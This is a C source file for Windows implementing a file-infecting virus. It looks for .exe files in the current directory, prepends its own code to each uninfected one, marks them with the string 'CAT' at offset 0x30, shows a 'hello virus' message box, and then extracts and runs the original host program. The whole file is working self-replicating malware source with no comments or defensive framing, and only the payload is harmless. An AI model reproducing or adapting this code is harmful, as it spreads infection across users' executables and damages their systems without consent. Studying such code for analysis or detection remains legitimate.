#include <windows.h>
#include <stdio.h> 
#include <stdlib.h>
	
#define __ERROR_EXIT__ if(GetLastError())exit(1);
#define __ERROR_CONTINUE__ if(GetLastError())continue;

__int64  getSizeOfFile(TCHAR* filename){
	HANDLE  fHandle=CreateFile(TEXT(filename),GENERIC_READ | GENERIC_EXECUTE,0,
			     NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	HANDLE fmapHandle=CreateFileMapping(fHandle,NULL,PAGE_EXECUTE_READ,0,0,NULL);
	LPVOID fAddress=MapViewOfFile(fmapHandle,FILE_MAP_READ,0,0,0);

	unsigned int sizeOfImage=*(unsigned int*)(fAddress+*(short* )(fAddress+0x3c)+0x50);
	
	UnmapViewOfFile(fAddress);
	CloseHandle(fmapHandle);
	CloseHandle(fHandle);
	return sizeOfImage;
}

bool checkInfectMark(TCHAR* origfullPath){
	
	FILE* f_check=fopen(origfullPath, "r");
	char infectedMark[3];
	fseek(f_check,0x30,SEEK_SET);
	fread(infectedMark,sizeof(char),sizeof(infectedMark),f_check);
	fclose(f_check);
	
	if(infectedMark[0]=='C'&&infectedMark[1]=='A'&&infectedMark[2]=='T'){
		return TRUE;
	}
	
	return FALSE;
}
bool validate(TCHAR* filename){
	return ! strcmp( filename+strlen(filename)-4 , ".exe");
}


void executePayload(){
	MessageBox(NULL,TEXT("hello, welcome to this magic world ~"),TEXT("hello virus"),MB_OK);
	
}

void putRawFile(FILE* f_append,char* rawFile,int sizeOfImage){
	
   		FILE* f_rawimage=fopen(rawFile, "rb");
		int rch=0,rch_sum=0; char buffer[25600];
    	while( ( rch=fread(buffer,sizeof(char),sizeof(buffer),f_rawimage) )>0) {
    		rch_sum+=rch;
    		if(rch_sum>=sizeOfImage){
    			rch-=(rch_sum-sizeOfImage);
			}
        	fwrite(buffer,sizeof(char),rch,f_append);
   		}
   		fclose(f_rawimage);
}

void appendHostFile(FILE* f_append,char* hostPath){
   		FILE* f_read=fopen(hostPath, "rb");
		int rch=0; char buffer[25600];
    	while( ( rch=fread(buffer,sizeof(char),sizeof(buffer),f_read) )>0) {
        	fwrite(buffer,sizeof(char),rch,f_append);
   		}
   		
   		fclose(f_read);
}

void writeInfectMark(FILE* f_infected){
   	fseek(f_infected,0x30,SEEK_SET);
   	fputc('C',f_infected);
   	fseek(f_infected,0x31,SEEK_SET);
   	fputc('A',f_infected);
   	fseek(f_infected,0x32,SEEK_SET);
   	fputc('T',f_infected);
}

void infect(const TCHAR* tempfullPath,char* rawFilePath,char* hostPath,int sizeOfImage){
   		FILE* f_append=fopen(tempfullPath, "ab");
   		putRawFile(f_append,rawFilePath,sizeOfImage);
		appendHostFile(f_append,hostPath);
   		fclose(f_append);
   		
		FILE* f_infected=fopen(tempfullPath, "rb+");
   		writeInfectMark(f_infected);
   		fclose(f_infected);
   		
   		
   		MoveFileEx(tempfullPath,hostPath,MOVEFILE_REPLACE_EXISTING);
}

void executeHostfile(TCHAR* tempfullPath,char* thisFile,int sizeOfImage){
   	remove(tempfullPath);
   	
	char* hostFileName=strcat(tempfullPath,".exe");
   	FILE* thisFileP=fopen(thisFile,"rb"),
   		* hostFileP=fopen(hostFileName,"wb");
   	fseek(thisFileP,sizeOfImage,SEEK_SET);
   	
   	int rch=0; char buffer[25600];
    while( (rch=fread(buffer,sizeof(char),sizeof(buffer),thisFileP) )>0) {
		fwrite(buffer,sizeof(char),rch,hostFileP);
   	}
   		
   	fclose(hostFileP);
   	fclose(thisFileP);
   	system(hostFileName);
   	remove(hostFileName);	
}

int main(int argc, char** argv) {
	TCHAR thisFile[MAX_PATH];
	GetModuleFileName(NULL,thisFile,sizeof(thisFile)); __ERROR_EXIT__
	int sizeOfImage=getSizeOfFile(thisFile);
	
	TCHAR tempPath[MAX_PATH];
	GetTempPath(MAX_PATH,tempPath);  __ERROR_EXIT__ 
	
	
	WIN32_FIND_DATA FindFileData;
   	HANDLE hFind = FindFirstFile("*",&FindFileData);
   	while(FindNextFile(hFind,&FindFileData)){
   		
		TCHAR origfullPath[MAX_PATH];
		GetFullPathName(FindFileData.cFileName,MAX_PATH,origfullPath,NULL); __ERROR_CONTINUE__

   		if( !validate(FindFileData.cFileName) )continue;
   		if( !strcmp(thisFile,origfullPath) )continue;
		if( checkInfectMark(origfullPath) )continue;
		
		
		TCHAR tempfullPath[MAX_PATH];
		GetTempFileName(tempPath,TEXT("inf"),0,tempfullPath); __ERROR_EXIT__

		infect(tempfullPath,thisFile,origfullPath,sizeOfImage);
    }  
	FindClose(hFind);

   	
   	executePayload();

   	
	TCHAR  tempfullPath[MAX_PATH];
	GetTempFileName(tempPath,TEXT("hst"),0,tempfullPath); __ERROR_EXIT__

	executeHostfile(tempfullPath,thisFile,sizeOfImage);
   	
	return 0;
}
